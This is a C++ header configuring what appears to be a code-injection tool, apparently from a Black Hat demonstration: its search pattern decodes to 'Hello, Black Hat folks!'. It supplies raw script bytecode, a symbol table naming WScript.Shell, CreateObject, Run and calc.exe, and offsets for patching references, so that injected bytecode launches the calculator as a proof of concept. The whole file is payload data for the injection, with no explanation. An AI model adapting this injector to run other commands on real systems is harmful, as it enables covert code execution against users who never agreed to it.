#ifndef _INJECTOR_CONFIG_H_
#define _INJECTOR_CONFIG_H_

#include <Windows.h>
#include <vector>

using std::vector;

typedef struct _Config {
    char *search_pattern;
    BYTE *bytecode_bytes;
    int bytecode_len;
    BYTE *symbol_table_bytes;
    int symbol_table_len;
    vector<off_t> bytecode_reference_offsets;
    vector<off_t> symbol_table_reference_offsets;
    vector<off_t> vpc_reference_offsets;
} Config;

char search_pattern[] = R"(\x48\x00\x65\x00\x6C\x00\x6C\x00\x6F\x00\x2C\x00\x20\x00\x42\x00\x6C\x00\x61\x00\x63\x00\x6B\x00\x20\x00\x48\x00\x61\x00\x74\x00\x20\x00\x66\x00\x6F\x00\x6C\x00\x6B\x00\x73\x00\x21\x00)";
BYTE bytecode_bytes[] = "\x56\x38\x00\x00\x00\x01\x00\x00\x03\x00\x0e\x48\x00\x00\x00\x28\x6c\x00\x00\x00\x01\x00\x1b\x01\x00\x03\x01\x19\x01\x00\x0e\x90\x00\x00\x00\x31\xac\x00\x00\x00\x01\x00\x02\x01\x00\x00\x00";
BYTE symbol_table_bytes[] = "\xcc\x00\x00\x00\x1c\x00\x00\x00\xb4\x00\x00\x00\x02\x00\x00\x00\xc8\x00\x00\x00\x01\x00\x00\x00\x00\x02\x00\x00\xb8\x00\x00\x00\x02\x00\x00\x00\xe8\x00\x00\x00\x18\x01\x00\x00\x44\x00\x00\x00\x62\x8e\x00\x00\x06\x00\x00\x00\x57\x00\x73\x00\x68\x00\x00\x00\x42\x0d\x6f\x26\x1a\x00\x00\x00\x57\x00\x53\x00\x63\x00\x72\x00\x69\x00\x70\x00\x74\x00\x2e\x00\x53\x00\x68\x00\x65\x00\x6c\x00\x6c\x00\x00\x00\x0b\xb7\xb7\x0f\x18\x00\x00\x00\x43\x00\x72\x00\x65\x00\x61\x00\x74\x00\x65\x00\x4f\x00\x62\x00\x6a\x00\x65\x00\x63\x00\x74\x00\x00\x00\x00\x00\xf3\xe0\x8d\x0a\x10\x00\x00\x00\x63\x00\x61\x00\x6c\x00\x63\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x00\x00\xe5\x88\x00\x00\x06\x00\x00\x00\x52\x00\x75\x00\x6e\x00\x00\x00";

Config config = {
    search_pattern,
    bytecode_bytes,
    sizeof(bytecode_bytes),
    symbol_table_bytes,
    sizeof(symbol_table_bytes),
    { 0x0, 0xb8 },
    { 0x0, 0xc0 },
    { 0x0, 0xb4 }
};

#endif  // _INJECTOR_CONFIG_H_